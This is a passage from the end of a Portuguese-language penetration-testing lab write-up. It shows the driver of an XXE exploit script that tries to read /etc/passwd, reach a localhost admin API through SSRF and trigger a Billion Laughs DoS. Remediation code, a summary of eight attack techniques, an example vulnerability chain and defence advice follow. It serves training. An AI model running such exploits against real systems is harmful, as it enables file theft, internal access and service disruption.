            r = requests.post(f'{self.url}/api/import', data=payload, headers=self.headers, timeout=5)
            return r.text
        except requests.Timeout:
            return "[!] Timeout - possível DoS"

if __name__ == '__main__':
    print("=" * 80)
    print("XXE EXPLOITATION")
    print("=" * 80)

    exploit = XXEExploit(BASE_URL, TOKEN)

    # Test file read
    print("\n[*] Testando XXE File Read (/etc/passwd)...")
    result = exploit.test_xxe_file_read('/etc/passwd')
    print(result[:200])

    # Test SSRF
    print("\n[*] Testando XXE SSRF...")
    result = exploit.test_xxe_ssrf('http://localhost:5002/api/admin/users')
    print(result[:200])

    # Test DoS
    print("\n[*] Testando Billion Laughs (DoS)...")
    result = exploit.test_xxe_billion_laughs()
    print(result)
```

### Remedição

```python
# CORRETO: Desabilite external entities

import xml.etree.ElementTree as ET
from defusedxml.ElementTree import parse, fromstring

# Opção 1: Use defusedxml
tree = fromstring(xml_data)  # Safe against XXE

# Opção 2: Configure parser manualmente
import xml.sax

parser = xml.sax.make_parser()
parser.setFeature(xml.sax.handler.feature_external_ges, False)
parser.setFeature(xml.sax.handler.feature_external_pes, False)

# Opção 3: Use lxml com segurança
from lxml import etree

parser = etree.XMLParser(resolve_entities=False, no_network=True)
tree = etree.fromstring(xml_data, parser)

# Melhor ainda: Use JSON em vez de XML!
```

---

## 📊 Resumo Completo - Lab 3

| # | Vulnerabilidade | Técnica | Impacto |
|---|----------------|---------|---------|
| 1 | JWT Algorithm Confusion | algorithm='none' | Authentication Bypass |
| 2 | Blind SQLi (Time-based) | SLEEP() + extraction | Data Exfiltration |
| 3 | Blind SQLi (Boolean) | Conditional responses | Data Exfiltration |
| 4 | Second-Order SQLi | Stored payload trigger | Data Manipulation |
| 5 | Race Condition | Concurrent requests | Logic bypass, duplication |
| 6 | SSRF Advanced | DNS rebinding, IPv6 | Internal network access |
| 7 | SSTI (Jinja2) | {{config}}, RCE | Server Compromise |
| 8 | XXE | External entities | File read, SSRF, DoS |

**Total: 240 pontos possíveis!**

---

## 🎓 Lições Finais

### Técnicas Avançadas

1. **Blind Exploitation** - Extrair dados sem feedback direto
2. **Race Conditions** - Explorar timing windows
3. **Second-Order Attacks** - Payloads que executam depois
4. **Template Injection** - Caminho para RCE
5. **XXE** - Poderoso mas cada vez mais raro

### Chains de Vulnerabilidades

Exemplo de chain completo:
1. **JWT none** → Acesso admin
2. **SSTI** → Read source code
3. **Second-Order SQLi** → Extract credentials
4. **SSRF** → Access internal services
5. **Race Condition** → Privilege escalation

### Defesa

1. **Defense in Depth** - Múltiplas camadas
2. **Principle of Least Privilege**
3. **Input Validation + Output Encoding**
4. **Security Testing** - SAST, DAST, Pentest
5. **Monitoring** - Detecte exploração em tempo real

---

**Parabéns por completar o Lab 3!** 🏆

Você agora domina técnicas avançadas de penetration testing.

**Próximos Passos**:
- HackTheBox
- Bug Bounty
- Certificações (OSCP, GWAPT)

**Voltar**: [README.md](../README.md)
